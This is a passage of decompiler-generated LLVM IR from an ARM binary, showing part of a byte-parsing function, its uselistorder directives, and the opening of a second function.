  %v7_11970 = icmp slt i32 %v2_11968, 18
  br i1 %v7_11970, label %bb137, label %dec_label_pc_11974

dec_label_pc_11974:                               ; preds = %dec_label_pc_11964
  %v1_11974 = and i32 %v3_11948, 1024
  %v2_11974 = icmp eq i32 %v1_11974, 0
  br i1 %v2_11974, label %bb137, label %bb136

bb136:                                            ; preds = %dec_label_pc_11974
  %v2_11978 = add i32 %v2_11968, -2
  store i32 %v2_11978, i32* %r2.global-to-local, align 4
  br label %bb137

bb137:                                            ; preds = %dec_label_pc_11964, %dec_label_pc_11974, %bb136
  %v0_1197c = phi i32 [ %v2_11968, %dec_label_pc_11964 ], [ %v2_11968, %dec_label_pc_11974 ], [ %v2_11978, %bb136 ]
  %v1_1197c = load i32, i32* %r7.global-to-local, align 4
  %v2_1197c = add i32 %v1_1197c, 32
  %v3_1197c = inttoptr i32 %v2_1197c to i32*
  store i32 %v0_1197c, i32* %v3_1197c, align 4
  store i32 ptrtoint (i32* @global_var_175a7.274 to i32), i32* %r1.global-to-local, align 4
  %v0_11988.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11984

dec_label_pc_11984:                               ; preds = %dec_label_pc_11984, %bb137
  %v0_11984 = phi i32 [ %v1_11984, %dec_label_pc_11984 ], [ ptrtoint (i32* @global_var_175a7.274 to i32), %bb137 ]
  %v1_11984 = add i32 %v0_11984, 1
  %v2_11984 = inttoptr i32 %v1_11984 to i8*
  %v3_11984 = load i8, i8* %v2_11984, align 1
  %v4_11984 = zext i8 %v3_11984 to i32
  store i32 %v4_11984, i32* %r3.global-to-local, align 4
  store i32 %v1_11984, i32* %r1.global-to-local, align 4
  %v8_1198c = icmp sgt i32 %v0_11988.pre, %v4_11984
  br i1 %v8_1198c, label %dec_label_pc_11984, label %dec_label_pc_11990

dec_label_pc_11990:                               ; preds = %dec_label_pc_11984
  store i32 ptrtoint (i32* @global_var_17598.278 to i32), i32* %r0.global-to-local, align 4
  %v2_11998 = sub i32 %v1_11984, ptrtoint (i32* @global_var_175a8.276 to i32)
  %v2_1199c = mul i32 %v2_11998, 2
  store i32 %v2_1199c, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_17588.280 to i32), i32* %ip.global-to-local, align 4
  %v2_119a4 = add i32 %v2_1199c, ptrtoint (i32* @global_var_17598.278 to i32)
  store i32 %v2_119a4, i32* %r2.global-to-local, align 4
  %v1_119a8 = add i32 %v2_1199c, add (i32 ptrtoint (i32* @global_var_17598.278 to i32), i32 1)
  %v2_119a8 = inttoptr i32 %v1_119a8 to i8*
  %v3_119a8 = load i8, i8* %v2_119a8, align 1
  %v4_119a8 = zext i8 %v3_119a8 to i32
  store i32 %v4_119a8, i32* %r1.global-to-local, align 4
  %v2_119ac = add i32 %v2_1199c, ptrtoint (i32* @global_var_17588.280 to i32)
  store i32 %v2_119ac, i32* %r2.global-to-local, align 4
  %v3_119b0 = inttoptr i32 %v2_119a4 to i8*
  %v4_119b0 = load i8, i8* %v3_119b0, align 2
  %v6_119b0 = zext i8 %v4_119b0 to i32
  store i32 %v6_119b0, i32* %r0.global-to-local, align 4
  %v1_119b4 = add i32 %v2_1199c, add (i32 ptrtoint (i32* @global_var_17588.280 to i32), i32 1)
  %v2_119b4 = inttoptr i32 %v1_119b4 to i8*
  %v3_119b4 = load i8, i8* %v2_119b4, align 1
  %v4_119b4 = zext i8 %v3_119b4 to i32
  store i32 %v4_119b4, i32* %r2.global-to-local, align 4
  %v3_119b8 = inttoptr i32 %v2_119ac to i8*
  %v4_119b8 = load i8, i8* %v3_119b8, align 2
  %v6_119b8 = zext i8 %v4_119b8 to i32
  %v3_119bc = mul nuw i32 %v4_119a8, 16777216
  store i32 %v3_119bc, i32* %r1.global-to-local, align 4
  %v4_119c0 = sdiv i32 %v3_119bc, 65536
  %v5_119c0 = or i32 %v6_119b0, %v4_119c0
  %v3_119c4 = mul nuw i32 %v4_119b4, 16777216
  store i32 %v3_119c4, i32* %r2.global-to-local, align 4
  %v4_119c8 = sdiv i32 %v3_119c4, 65536
  %v5_119c8 = or i32 %v6_119b8, %v4_119c8
  store i32 %v5_119c8, i32* %r3.global-to-local, align 4
  %v0_119cc = load i32, i32* @lr, align 4
  %v2_119cc = or i32 %v5_119c0, %v0_119cc
  store i32 ptrtoint ([21 x i8]* @global_var_175b4.272 to i32), i32* %ip.global-to-local, align 4
  %v2_119d4 = and i32 %v2_119cc, %v5_119c8
  store i32 %v2_119d4, i32* %r0.global-to-local, align 4
  %v0_119f0.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_119e8

dec_label_pc_119dc:                               ; preds = %dec_label_pc_11958
  %v1_119dc = add i32 %v1_11968, 1
  %v2_119dc = inttoptr i32 %v1_119dc to i8*
  %v3_119dc = load i8, i8* %v2_119dc, align 1
  %v4_119dc = zext i8 %v3_119dc to i32
  store i32 %v4_119dc, i32* %r3.global-to-local, align 4
  store i32 %v1_119dc, i32* %ip.global-to-local, align 4
  %v2_119e0 = icmp eq i8 %v3_119dc, 0
  br i1 %v2_119e0, label %dec_label_pc_119e8, label %dec_label_pc_11958

dec_label_pc_119e8:                               ; preds = %dec_label_pc_119dc, %dec_label_pc_11990
  %v0_119f4 = phi i32 [ %v0_119cc, %dec_label_pc_11990 ], [ %v3_11948, %dec_label_pc_119dc ]
  %v0_119f0 = phi i32 [ %v0_119f0.pre, %dec_label_pc_11990 ], [ %v0_1193c, %dec_label_pc_119dc ]
  %v0_119e8 = phi i32 [ %v2_119d4, %dec_label_pc_11990 ], [ %v3_11954, %dec_label_pc_119dc ]
  store i32 %v0_119e8, i32* %stack_var_-36, align 4
  %v0_119ec = load i32, i32* @r4, align 4
  %v1_119ec = and i32 %v0_119ec, 4
  %v1_119f0 = inttoptr i32 %v0_119f0 to i8*
  %v2_119f0 = load i8, i8* %v1_119f0, align 1
  %v3_119f0 = zext i8 %v2_119f0 to i32
  store i32 %v3_119f0, i32* %r1.global-to-local, align 4
  %v1_119f4 = and i32 %v0_119f4, 3840
  %v1_119f8 = and i32 %v0_119ec, -5
  %v2_119fc = or i32 %v1_119f8, %v1_119f4
  store i32 %v2_119fc, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %tmp164 = mul nuw nsw i32 %v1_119ec, 4
  %tmp165 = or i32 %tmp164, 32
  store i32 %tmp165, i32* %r3.global-to-local, align 4
  %v1_11a0c = load i32, i32* %r7.global-to-local, align 4
  %v2_11a0c = add i32 %v1_11a0c, 12
  %v3_11a0c = inttoptr i32 %v2_11a0c to i32*
  store i32 %v3_119f0, i32* %v3_11a0c, align 4
  %v0_11a10 = load i32, i32* %r7.global-to-local, align 4
  %v1_11a10 = add i32 %v0_11a10, 4
  %v2_11a10 = inttoptr i32 %v1_11a10 to i32*
  %v3_11a10 = load i32, i32* @r5, align 4
  store i32 %v3_11a10, i32* %v2_11a10, align 4
  %v4_11a10 = add i32 %v0_11a10, 8
  %v5_11a10 = inttoptr i32 %v4_11a10 to i32*
  %v6_11a10 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v6_11a10, i32* %v5_11a10, align 4
  %v0_11a14 = load i32, i32* %r3.global-to-local, align 4
  %v1_11a14 = load i32, i32* %r7.global-to-local, align 4
  %v2_11a14 = add i32 %v1_11a14, 20
  %v3_11a14 = inttoptr i32 %v2_11a14 to i32*
  store i32 %v0_11a14, i32* %v3_11a14, align 4
  %v0_11a18 = load i32, i32* %r2.global-to-local, align 4
  %v1_11a18 = load i32, i32* %r7.global-to-local, align 4
  %v2_11a18 = add i32 %v1_11a18, 16
  %v3_11a18 = inttoptr i32 %v2_11a18 to i32*
  store i32 %v0_11a18, i32* %v3_11a18, align 4
  %v0_11a1c = load i32, i32* %r0.global-to-local, align 4
  %v1_11a1c = load i32, i32* %r7.global-to-local, align 4
  %v2_11a1c = add i32 %v1_11a1c, 28
  %v3_11a1c = inttoptr i32 %v2_11a1c to i32*
  store i32 %v0_11a1c, i32* %v3_11a1c, align 4
  %v0_11a20 = load i32, i32* %ip.global-to-local, align 4
  %v1_11a20 = inttoptr i32 %v0_11a20 to i8*
  %v2_11a20 = load i8, i8* %v1_11a20, align 1
  %v3_11a20 = zext i8 %v2_11a20 to i32
  store i32 %v3_11a20, i32* %r2.global-to-local, align 4
  %v2_11a24 = icmp eq i8 %v2_11a20, 0
  br i1 %v2_11a24, label %dec_label_pc_11a2c, label %dec_label_pc_11a44

dec_label_pc_11a2c:                               ; preds = %dec_label_pc_119e8
  %v0_11a2c = load i32, i32* %r6.global-to-local, align 4
  %v1_11a2c = inttoptr i32 %v0_11a2c to i8*
  %v2_11a2c = load i8, i8* %v1_11a2c, align 1
  %v3_11a2c = zext i8 %v2_11a2c to i32
  store i32 %v3_11a2c, i32* %r3.global-to-local, align 4
  %v7_11a30 = icmp eq i8 %v2_11a2c, 109
  br i1 %v7_11a30, label %dec_label_pc_11a38, label %dec_label_pc_11b48

dec_label_pc_11a38:                               ; preds = %dec_label_pc_11a2c
  store i32 20, i32* %r3.global-to-local, align 4
  %v1_11a3c = load i32, i32* %r7.global-to-local, align 4
  %v2_11a3c = add i32 %v1_11a3c, 32
  %v3_11a3c = inttoptr i32 %v2_11a3c to i32*
  store i32 20, i32* %v3_11a3c, align 4
  %v0_11a40 = load i32, i32* %r2.global-to-local, align 4
  %v1_11a40 = load i32, i32* %r7.global-to-local, align 4
  %v2_11a40 = add i32 %v1_11a40, 28
  %v3_11a40 = inttoptr i32 %v2_11a40 to i32*
  store i32 %v0_11a40, i32* %v3_11a40, align 4
  br label %dec_label_pc_11a44

dec_label_pc_11a44:                               ; preds = %dec_label_pc_119e8, %dec_label_pc_11a38
  %v0_11a44 = load i32, i32* %sb.global-to-local, align 4
  %tmp141 = icmp slt i32 %v0_11a44, 1
  br i1 %tmp141, label %dec_label_pc_11afc, label %dec_label_pc_11a4c

dec_label_pc_11a4c:                               ; preds = %dec_label_pc_11a44
  store i32 0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_11a50

dec_label_pc_11a50:                               ; preds = %dec_label_pc_11ae4, %dec_label_pc_11a4c
  %v8_11a6c = phi i32 [ 0, %dec_label_pc_11a4c ], [ %v1_11ae8, %dec_label_pc_11ae4 ]
  %v7_11a54 = icmp sgt i32 %v8_11a6c, 2
  br i1 %v7_11a54, label %bb143, label %bb142

bb142:                                            ; preds = %dec_label_pc_11a50
  store i32 %v25_116b4, i32* %r2.global-to-local, align 4
  %v12_11a58 = mul i32 %v8_11a6c, 4
  %v13_11a58 = add i32 %v12_11a58, %v25_116b4
  store i32 %v13_11a58, i32* %r3.global-to-local, align 4
  %v9_11a5c = add i32 %v13_11a58, -24
  %v10_11a5c = inttoptr i32 %v9_11a5c to i32*
  %v11_11a5c = load i32, i32* %v10_11a5c, align 4
  store i32 %v11_11a5c, i32* %r2.global-to-local, align 4
  %v9_11a60 = load i32, i32* %r7.global-to-local, align 4
  %v10_11a60 = add i32 %v9_11a60, %v8_11a6c
  store i32 %v10_11a60, i32* %r3.global-to-local, align 4
  %v9_11a68 = trunc i32 %v11_11a5c to i8
  %v11_11a68 = add i32 %v10_11a60, 36
  %v12_11a68 = inttoptr i32 %v11_11a68 to i8*
  store i8 %v9_11a68, i8* %v12_11a68, align 1
  %v8_11a70 = load i32, i32* %r3.global-to-local, align 4
  %v9_11a70 = add i32 %v8_11a70, 36
  %v10_11a70 = inttoptr i32 %v9_11a70 to i8*
  %v11_11a70 = load i8, i8* %v10_11a70, align 1
  %v12_11a70 = zext i8 %v11_11a70 to i32
  br label %bb144

bb143:                                            ; preds = %dec_label_pc_11a50
  %v10_11a6c = add i32 %v8_11a6c, %stack_var_-48.3
  store i32 %v10_11a6c, i32* %r3.global-to-local, align 4
  %v9_11a74 = add i32 %v10_11a6c, -2
  br label %bb144

bb144:                                            ; preds = %bb142, %bb143
  %v0_11a98 = phi i32 [ %v12_11a70, %bb142 ], [ %v9_11a74, %bb143 ]
  store i32 %v0_11a98, i32* @r2, align 4
  %v1_11a78 = load i32, i32* %sb.global-to-local, align 4
  %v2_11a78 = sub i32 %v0_11a98, %v1_11a78
  %v4_11a78 = xor i32 %v1_11a78, %v0_11a98
  %v5_11a78 = xor i32 %v2_11a78, %v0_11a98
  %v6_11a78 = and i32 %v5_11a78, %v4_11a78
  %v7_11a78 = icmp slt i32 %v6_11a78, 0
  %v8_11a78 = icmp slt i32 %v2_11a78, 0
  %v9_11a78 = icmp eq i32 %v0_11a98, %v1_11a78
  %v3_11a7c = xor i1 %v8_11a78, %v7_11a78
  %v4_11a7c = or i1 %v9_11a78, %v3_11a7c
  br i1 %v4_11a7c, label %dec_label_pc_11a8c, label %dec_label_pc_11a80

dec_label_pc_11a80:                               ; preds = %bb144
  %v1_11a80 = add i32 %v0_11a98, -9
  %v3_11a80 = sub i32 8, %v0_11a98
  %v4_11a80 = and i32 %v3_11a80, %v0_11a98
  %v5_11a80 = icmp slt i32 %v4_11a80, 0
  %v6_11a80 = icmp slt i32 %v1_11a80, 0
  %v7_11a80 = icmp eq i32 %v0_11a98, 9
  %v3_11a84 = xor i1 %v6_11a80, %v5_11a80
  %v4_11a84 = or i1 %v7_11a80, %v3_11a84
  br i1 %v4_11a84, label %dec_label_pc_11a88, label %dec_label_pc_11b48

dec_label_pc_11a88:                               ; preds = %dec_label_pc_11a80
  store i32 %v0_11a98, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_11a8c

dec_label_pc_11a8c:                               ; preds = %bb144, %dec_label_pc_11a88
  store i32 %v25_116b4, i32* %ip.global-to-local, align 4
  %v1_11a90 = load i32, i32* %r8.global-to-local, align 4
  %v4_11a90 = mul i32 %v1_11a90, 4
  %v5_11a90 = add i32 %v4_11a90, %v25_116b4
  store i32 %v5_11a90, i32* %r3.global-to-local, align 4
  %v1_11a94 = add i32 %v5_11a90, -12
  %v2_11a94 = inttoptr i32 %v1_11a94 to i32*
  %v3_11a94 = load i32, i32* %v2_11a94, align 4
  store i32 %v3_11a94, i32* %r5.global-to-local, align 4
  %v1_11a98 = add i32 %v0_11a98, -1
  store i32 %v1_11a98, i32* %sl.global-to-local, align 4
  %v0_11a9c = load i32, i32* %r7.global-to-local, align 4
  %v4_11a9c = mul i32 %v1_11a98, 4
  %v5_11a9c = add i32 %v0_11a9c, %v4_11a9c
  store i32 %v5_11a9c, i32* %r3.global-to-local, align 4
  %v7_11aa0 = icmp eq i32 %v3_11a94, 8
  %v1_11aa4 = add i32 %v5_11a9c, 40
  %v2_11aa4 = inttoptr i32 %v1_11aa4 to i32*
  %v3_11aa4 = load i32, i32* %v2_11aa4, align 4
  store i32 %v3_11aa4, i32* @r0, align 4
  br i1 %v7_11aa0, label %dec_label_pc_11ae4, label %dec_label_pc_11aac

dec_label_pc_11aac:                               ; preds = %dec_label_pc_11a8c
  %v9_11aac = icmp eq i32 %v3_11aa4, %v3_11a94
  br i1 %v9_11aac, label %dec_label_pc_11ad0, label %bb145

bb145:                                            ; preds = %dec_label_pc_11aac
  %v8_11ab0 = icmp eq i32 %v3_11aa4, 8
  br i1 %v8_11ab0, label %dec_label_pc_11ad0, label %dec_label_pc_11ab8

dec_label_pc_11ab8:                               ; preds = %bb145
  %v0_11ab8 = call i32 @function_11668()
  %v0_11ac0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_11ac0, i32* @r0, align 4
  %v0_11ac4 = call i32 @function_11668()
  store i32 %v0_11ac4, i32* %r0.global-to-local, align 4
  %v8_11acc = icmp sgt i32 %v0_11ab8, %v0_11ac4
  br i1 %v8_11acc, label %dec_label_pc_11ae4, label %dec_label_pc_11ab8.dec_label_pc_11ad0_crit_edge

dec_label_pc_11ab8.dec_label_pc_11ad0_crit_edge:  ; preds = %dec_label_pc_11ab8
  %v1_11ad4.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_11adc.pre = load i32, i32* %r7.global-to-local, align 4
  %v1_11adc.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_11ad0

dec_label_pc_11ad0:                               ; preds = %dec_label_pc_11ab8.dec_label_pc_11ad0_crit_edge, %dec_label_pc_11aac, %bb145
  %v1_11adc = phi i32 [ %v1_11adc.pre, %dec_label_pc_11ab8.dec_label_pc_11ad0_crit_edge ], [ %v1_11a98, %dec_label_pc_11aac ], [ %v1_11a98, %bb145 ]
  %v0_11adc = phi i32 [ %v0_11adc.pre, %dec_label_pc_11ab8.dec_label_pc_11ad0_crit_edge ], [ %v0_11a9c, %dec_label_pc_11aac ], [ %v0_11a9c, %bb145 ]
  %v1_11ad4 = phi i32 [ %v1_11ad4.pre, %dec_label_pc_11ab8.dec_label_pc_11ad0_crit_edge ], [ %v1_11a90, %dec_label_pc_11aac ], [ %v1_11a90, %bb145 ]
  store i32 %v25_116b4, i32* %r1.global-to-local, align 4
  %v4_11ad4 = mul i32 %v1_11ad4, 4
  %v5_11ad4 = add i32 %v4_11ad4, %v25_116b4
  store i32 %v5_11ad4, i32* %r3.global-to-local, align 4
  %v1_11ad8 = add i32 %v5_11ad4, -12
  %v2_11ad8 = inttoptr i32 %v1_11ad8 to i32*
  %v3_11ad8 = load i32, i32* %v2_11ad8, align 4
  store i32 %v3_11ad8, i32* @r2, align 4
  %v4_11adc = mul i32 %v1_11adc, 4
  %v5_11adc = add i32 %v4_11adc, %v0_11adc
  store i32 %v5_11adc, i32* %r3.global-to-local, align 4
  %v2_11ae0 = add i32 %v5_11adc, 40
  %v3_11ae0 = inttoptr i32 %v2_11ae0 to i32*
  store i32 %v3_11ad8, i32* %v3_11ae0, align 4
  br label %dec_label_pc_11ae4

dec_label_pc_11ae4:                               ; preds = %dec_label_pc_11ab8, %dec_label_pc_11a8c, %dec_label_pc_11ad0
  %v0_11ae4 = load i32, i32* %r7.global-to-local, align 4
  %v1_11ae4 = add i32 %v0_11ae4, 28
  %v2_11ae4 = inttoptr i32 %v1_11ae4 to i32*
  %v3_11ae4 = load i32, i32* %v2_11ae4, align 4
  %v0_11ae8 = load i32, i32* %r8.global-to-local, align 4
  %v1_11ae8 = add i32 %v0_11ae8, 1
  store i32 %v1_11ae8, i32* %r8.global-to-local, align 4
  %v1_11aec = add i32 %v3_11ae4, 2
  store i32 %v1_11aec, i32* %r3.global-to-local, align 4
  %v6_11af4 = icmp slt i32 %v1_11ae8, %v1_11aec
  br i1 %v6_11af4, label %dec_label_pc_11a50, label %dec_label_pc_11b14

dec_label_pc_11afc:                               ; preds = %dec_label_pc_11a44
  %v0_11afc = load i32, i32* %r7.global-to-local, align 4
  %v1_11afc = add i32 %v0_11afc, 28
  %v2_11afc = inttoptr i32 %v1_11afc to i32*
  %v3_11afc = load i32, i32* %v2_11afc, align 4
  store i32 %v3_11afc, i32* %r2.global-to-local, align 4
  %v0_11b00 = load i32, i32* %r0.global-to-local, align 4
  %v1_11b00 = trunc i32 %v0_11b00 to i8
  %v3_11b00 = add i32 %v0_11afc, 38
  %v4_11b00 = inttoptr i32 %v3_11b00 to i8*
  store i8 %v1_11b00, i8* %v4_11b00, align 1
  %v0_11b04 = load i32, i32* %r2.global-to-local, align 4
  %v3_11b04 = mul i32 %v0_11b04, 4
  store i32 %v3_11b04, i32* @r2, align 4
  %v0_11b08 = load i32, i32* %r7.global-to-local, align 4
  %v1_11b08 = add i32 %v0_11b08, 40
  store i32 %v1_11b08, i32* @r0, align 4
  %v2_11b0c = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_11b0c, i32* @r1, align 4
  %v0_11b10 = call i32 @function_11d60()
  store i32 %v0_11b10, i32* %r0.global-to-local, align 4
  %v0_11b14.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_11b14

dec_label_pc_11b14:                               ; preds = %dec_label_pc_11ae4, %dec_label_pc_11afc
  %v2_11b30 = phi i32 [ %v0_11b14.pre, %dec_label_pc_11afc ], [ %v0_11ae4, %dec_label_pc_11ae4 ]
  %v1_11b14 = add i32 %v2_11b30, 16
  %v2_11b14 = inttoptr i32 %v1_11b14 to i32*
  %v3_11b14 = load i32, i32* %v2_11b14, align 4
  store i32 %v3_11b14, i32* %r3.global-to-local, align 4
  %v1_11b18 = and i32 %v3_11b14, 128
  %v2_11b18 = icmp eq i32 %v1_11b18, 0
  br i1 %v2_11b18, label %.thread46, label %.thread44

.thread44:                                        ; preds = %dec_label_pc_11b14
  store i32 %v2_116bc, i32* %r3.global-to-local, align 4
  %v2_11b20 = inttoptr i32 %v2_11b30 to i32*
  %v3_11b20 = load i32, i32* %v2_11b20, align 4
  %v2_11b28.pre = load i32, i32* %r6.global-to-local, align 4
  %v3_11b28 = sub i32 %v2_11b28.pre, %v2_116bc
  store i32 %v3_11b28, i32* %r3.global-to-local, align 4
  %v5_11b2c = mul i32 %v3_11b28, 4
  %v6_11b2c = add i32 %v5_11b2c, %v3_11b20
  store i32 %v6_11b2c, i32* @r2, align 4
  br label %bb146

.thread46:                                        ; preds = %dec_label_pc_11b14
  %v1_11b2441 = load i32, i32* %r6.global-to-local, align 4
  %v2_11b2442 = add i32 %v1_11b2441, 1
  store i32 %v2_11b2442, i32* %r3.global-to-local, align 4
  %v3_11b30 = inttoptr i32 %v2_11b30 to i32*
  store i32 %v2_11b2442, i32* %v3_11b30, align 4
  %v0_11b34.pre = load i32, i32* %r7.global-to-local, align 4
  br label %bb146

bb146:                                            ; preds = %.thread44, %.thread46
  %v1_11b3c = phi i32 [ %v2_11b30, %.thread44 ], [ %v0_11b34.pre, %.thread46 ]
  %v1_11b34 = add i32 %v1_11b3c, 28
  %v2_11b34 = inttoptr i32 %v1_11b34 to i32*
  %v3_11b34 = load i32, i32* %v2_11b34, align 4
  store i32 %v3_11b34, i32* %r3.global-to-local, align 4
  %v1_11b38 = add i32 %v3_11b34, 2
  store i32 %v1_11b38, i32* %r0.global-to-local, align 4
  %v0_11b3c = load i32, i32* %sb.global-to-local, align 4
  %v2_11b3c = add i32 %v1_11b3c, 24
  %v3_11b3c = inttoptr i32 %v2_11b3c to i32*
  store i32 %v0_11b3c, i32* %v3_11b3c, align 4
  br i1 %v2_11b18, label %dec_label_pc_11b4c, label %bb147

bb147:                                            ; preds = %bb146
  %v1_11b40 = load i32, i32* @r2, align 4
  %v2_11b40 = load i32, i32* %r7.global-to-local, align 4
  %v3_11b40 = inttoptr i32 %v2_11b40 to i32*
  store i32 %v1_11b40, i32* %v3_11b40, align 4
  br label %dec_label_pc_11b4c

dec_label_pc_11b48:                               ; preds = %dec_label_pc_11704, %dec_label_pc_11810, %dec_label_pc_118c0, %dec_label_pc_11894, %dec_label_pc_118a0, %dec_label_pc_117e0, %dec_label_pc_11a80, %dec_label_pc_11a2c, %.thread25
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11b4c

dec_label_pc_11b4c:                               ; preds = %bb147, %bb146, %dec_label_pc_11b48
  %v2_11b50 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_11b50, i32* @r4, align 4
  store i32 %v6_116b4, i32* @r5, align 4
  %v26_11b50 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v26_11b50

; uselistorder directives
  uselistorder i32 %v3_11b28, { 1, 0 }
  uselistorder i32 %v1_11ae8, { 1, 2, 0 }
  uselistorder i32 %v0_11a9c, { 1, 2, 0 }
  uselistorder i32 %v2_11a78, { 1, 0 }
  uselistorder i32 %v1_11a78, { 1, 0, 2 }
  uselistorder i32 %v0_11a98, { 3, 4, 5, 0, 7, 6, 9, 1, 2, 8, 10 }
  uselistorder i32 %v1_119dc, { 1, 2, 0 }
  uselistorder i32 %v3_119c4, { 1, 0 }
  uselistorder i32 %v3_119bc, { 1, 0 }
  uselistorder i32 %v2_1199c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_11984, { 0, 2, 3, 1 }
  uselistorder i32 %v1_11968, { 1, 0, 2 }
  uselistorder i32 %v3_11948, { 2, 1, 0 }
  uselistorder i32 %v1_1190c, { 0, 2, 3, 1 }
  uselistorder i32 %v2_118e0, { 1, 0 }
  uselistorder i32 %v5_11840, { 0, 1, 3, 2 }
  uselistorder i32 %v0_11840, { 1, 0 }
  uselistorder i32 %storemerge105, { 1, 0, 4, 5, 2, 3 }
  uselistorder i32 %stack_var_-48.2, { 1, 0 }
  uselistorder i32 %v2_117ec, { 1, 0 }
  uselistorder i32 %v0_11808, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v0_117d0, { 2, 3, 4, 6, 0, 1, 5, 7 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_117b8, { 2, 3, 4, 5, 0, 1, 6 }
  uselistorder i32 %v3_117a4, { 1, 2, 0 }
  uselistorder i32 %v0_1181c, { 1, 2, 3, 0, 4, 7, 5, 6 }
  uselistorder i32 %stack_var_-48.1, { 1, 2, 3, 0 }
  uselistorder i32 %v0_11758, { 1, 0 }
  uselistorder i32 %v1_11728, { 0, 2, 1 }
  uselistorder i32 %v25_116b4, { 0, 8, 1, 9, 2, 7, 3, 10, 4, 5, 6 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i32* %stack_var_-36, { 2, 0, 1 }
  uselistorder i32 %tmp, { 0, 3, 2, 1, 4 }
  uselistorder i32* %sb.global-to-local, { 4, 0, 5, 6, 7, 1, 2, 3, 8, 9 }
  uselistorder i32* %r8.global-to-local, { 0, 2, 1, 3, 4, 7, 6, 5, 8 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 16, 2, 6, 3, 17, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 18 }
  uselistorder i32* %r6.global-to-local, { 14, 13, 10, 8, 0, 2, 11, 3, 4, 5, 7, 9, 15, 6, 1, 12 }
  uselistorder i32* %r3.global-to-local, { 0, 48, 8, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 12, 14, 13, 49, 50, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28, 27, 29, 30, 31, 32, 33, 34, 35, 38, 39, 40, 36, 37, 41, 42, 43, 44, 45, 46, 47 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 12, 13, 15, 10, 16, 14 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 1, 4, 6, 5, 7, 8, 9, 10, 11, 12, 23, 22, 13, 25, 14, 15, 16, 26, 17, 27, 18, 28, 19, 20, 21, 24, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 8, 7 }
  uselistorder i32 38, { 1, 0 }
  uselistorder i32 ()* @function_11668, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_17588.280 to i32), { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_17598.278 to i32), { 1, 0, 2 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_175b4.272 to i32), { 2, 1, 3, 0, 4 }
  uselistorder i32 ptrtoint ([9 x i8]* @global_var_17574.270 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i8 36, { 1, 0 }
  uselistorder i8 37, { 2, 3, 4, 1, 5, 0, 6, 7 }
  uselistorder label %dec_label_pc_11b4c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11b48, { 6, 7, 8, 2, 4, 3, 1, 5, 0 }
  uselistorder label %bb146, { 1, 0 }
  uselistorder label %dec_label_pc_11b14, { 1, 0 }
  uselistorder label %dec_label_pc_11ae4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11ad0, { 0, 2, 1 }
  uselistorder label %dec_label_pc_11a8c, { 1, 0 }
  uselistorder label %bb144, { 1, 0 }
  uselistorder label %dec_label_pc_11a44, { 1, 0 }
  uselistorder label %bb137, { 2, 1, 0 }
  uselistorder label %.thread25, { 2, 0, 1 }
  uselistorder label %dec_label_pc_118f8, { 1, 0 }
  uselistorder label %dec_label_pc_118d0, { 1, 0 }
  uselistorder label %dec_label_pc_11880, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_11800, { 2, 0, 1 }
  uselistorder label %dec_label_pc_117fc, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %.backedge, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1175c, { 1, 0 }
  uselistorder label %dec_label_pc_1174c, { 1, 0 }
}

define i32 @function_11b78(i8 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11b78:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg2 to i8*
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp5 = sext i8 %arg1 to i32
  store i32 %tmp5, i32* %r0.global-to-local, align 4
  %stack_var_-13 = alloca i8, align 1
  %stack_var_-12 = alloca i32, align 4
  %v3_11b78 = load i32, i32* @r4, align 4
  store i32 %v3_11b78, i32* %stack_var_-12, align 4
  %v2_11b7c = add i32 %arg2, 16
  %v3_11b7c = inttoptr i32 %v2_11b7c to i32*
  %v4_11b7c = load i32, i32* %v3_11b7c, align 4
  store i32 %v4_11b7c, i32* @r2, align 4
  %v2_11b80 = add i32 %arg2, 28
  %v3_11b80 = inttoptr i32 %v2_11b80 to i32*
  %v4_11b80 = load i32, i32* %v3_11b80, align 4
  store i32 %v4_11b80, i32* %r3.global-to-local, align 4
  %v3_11b84 = icmp uge i32 %v4_11b7c, %v4_11b80
